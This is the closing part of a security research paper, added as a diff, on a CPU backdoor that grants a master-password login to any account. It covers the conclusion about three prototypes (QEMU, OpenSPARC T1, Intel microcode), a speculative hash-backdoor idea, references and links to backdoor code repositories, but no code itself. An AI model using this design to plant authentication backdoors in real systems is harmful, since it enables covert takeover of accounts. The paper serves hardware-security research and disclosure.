+In practice, storing just a few hash strings in the CPU is not particularly
+useful because a single hash only represents one digital signature. Now,
+consider if the hash function had an algorithmic backdoor: one that
+produces detectable patterns when processing specially crafted inputs (such
+as those beginning with a particular header sequence). The CPU could detect
+this pattern during string comparison and let the malicious hash to pass
+authentication.
+
+I'm not certain whether this is feasible, but it's certainly an interesting
+idea to explore.
+
+
+--[ 5. Conclusion
+
+This paper introduces a CPU backdoor that enables an attacker to log into
+any account on the system using a master password.
+
+To test the idea, three prototypes are built: one on the QEMU TCG emulator,
+another on the OpenSPARC T1 processor (FPGA-based), and a third via
+microcode modification on an Intel Pentium N4200 CPU.
+
+The idea we aim to convey is this: while embedding backdoors deeper into
+hardware improves stealth, hardware alone imposes usability constraints.
+However, if the software intentionally cooperates the hardware, we gain
+more opportunities to deploy effective CPU backdoors. In our approach, the
+upper-layer operating system's password authentication module exhibits
+detectable behavioral patterns, which the CPU monitors to infer
+authentication events.
+
+
+--[ 6. Acknowledgements
+
+Special thank you to my wife uay and our kids Ray and Summer! You never
+stop believing in me. Even after three long years, you still have faith
+that I'll finish this paper. I love you all so much!
+
+Thanks to ChatGPT and DeepSeek for helping me write this paper!
+
+
+--[ 7. References
+
+ [1] https://wiki.qemu.org/Documentation/TCG/frontend-ops
+ [2] SPARC Assembly Language Reference Manual
+     https://docs.oracle.com/cd/E36784_01/pdf/E36858.pdf
+ [3] CPU bugs, CPU backdoors and consequences on security
+ [4] Live Migration with AMD-V Extended Migration Technology
+     http://developer.amd.com/wordpress/media/2013/02/
+     livevirtualmachinemigrationonamdprocessors.pdf
+ [5] A Performance Evaluation of Platform-Independent Methods to Search for
+     Hidden Instructions on RISC Processors.
+ [6] Breaking the x86 ISA. BlackHat, USA, 2017.
+ [7] Uisfuzz: An efficient fuzzing method for CPU undocumented instruction
+     searching.
+ [8] Uncovering Hidden Instructions in Armv8-A Implementations.
+ [9] VIA C3 Nehemiah Datasheet, 2004.
+     http://datasheets.chipdb.org/VIA/Samuel2/VIA%20C3%20Samuel%202%20
+     Datasheet%20V1.12.pdf
+[10] Christopher Domas. Hardware backdoors in x86 CPUs. Black Hat, 2018.
+[11] Apparatus and method for limiting access to model specific registers
+     in a microprocessor, December 25 2012. US Patent 8,341,419.
+[12] Microprocessor that performs X86 ISA and arm ISA machine language
+     program instructions by hardware translation into microinstructions
+     executed by common execution pipeline, November 4 2014. US Patent
+     8,880,851.
+[13] Microprocessor with boot indicator that indicates a boot ISA of the
+     microprocessor as either the X86 ISA or the ARM ISA, April 19 2016.
+     US Patent 9,317,301.
+[14] Microprocessor that enables ARM ISA program to access 64-bit general
+     purpose registers written by x86 ISA program, March 22 2016. US
+     Patent 9,292,470.
+[15] 'Super-secret' debugger discovered in AMD CPUs
+     https://www.theregister.com/2010/11/15/amd_secret_debugger/
+[16] AMD Undocumented Machine-Specific Registers
+     http://cbid.softnology.biz/html/undocmsrs.html
+[17] https://sourceware.org/glibc/wiki/GNU_IFUNC
+[18] Designing and implementing malicious hardware
+[19] https://openpower.foundation/specifications/isa/
+[20] Alexander Krog and Alexander Skovsende. Backdoor in the Core -
+     Altering the Intel x86 Instruction Set at Runtime. Defcon 31, 2023
+[21] RISC86 INSTRUCTION SET. US Patent US5926642, 1999
+[22] AMD-K6 Processor Technical Brief
+     https://www.ardent-tool.com/CPU/docs/AMD/K6/k6_techb.pdf
+[23] IntelTXE-PoC. https://github.com/ptresearch/IntelTXE-PoC
+[24] https://www.intel.com/content/www/us/en/security-center/advisory/
+     intel-sa-00086.html
+[25] uCodeDisam. https://github.com/chip-red-pill/uCodeDisasm
+[26] udbgInstr https://github.com/chip-red-pill/udbgInstr
+[27] lib-micro. https://libmicro.dev
+[28] https://kakaroto.ca/2019/11/exploiting-intels-management-engine-part-1
+     -understanding-pts-txe-poc/
+[29] EFFICIENT RANGE - BASED MEMORY WRITEBACK TO IMPROVE HOST TO DEVICE
+     COMMUNICATION FOR OPTIMAL POWER AND PERFORMANCE. US Patent
+     US 10,552,153 B2. 2020
+[30] Ermolov, M., Sklyarov, D. & Goryachy, M. Undocumented x86 instructions
+     to control the CPU at the microarchitecture level in modern Intel
+     processors. J Comput Virol Hack Tech 19. 2023
+[31] CONTROL REGISTER BUS ACCESS THROUGH A STANDARDIZED TEST ACCESS PORT.
+     US Patent US006055656A. 2000
+[32] Intel LDAT notes. https://pbx.sh/ldat/
+[33] crbus_scripts. https://github.com/chip-red-pill/crbus_scripts
+[34] Live Migration With AMD-V Extended Migration Technology.
+     https://kipdf.com/live-migration-with-amd-v-extended-migration-
+     technology_5acde91c7f8b9a7f9b8b45f1.html
+
+
+--[ 8. Appendix: Code
+
+Due to the large size of the OpenSPARCT1 and QEMU projects, only the
+portion of code containing the backdoor implementation is included in the
+code.tar.gz file. For the full projects, please visit the following links:
+
+https://www.oracle.com/servers/technologies/opensparc-t1-page.html
+https://github.com/qemu/QEMU
+
+
+I’ve uploaded microcode-related projects to GitHub:
+
+https://github.com/whensungoesdown/lib-micro
+https://github.com/whensungoesdown/coreboot
+
+
+--[ EOF
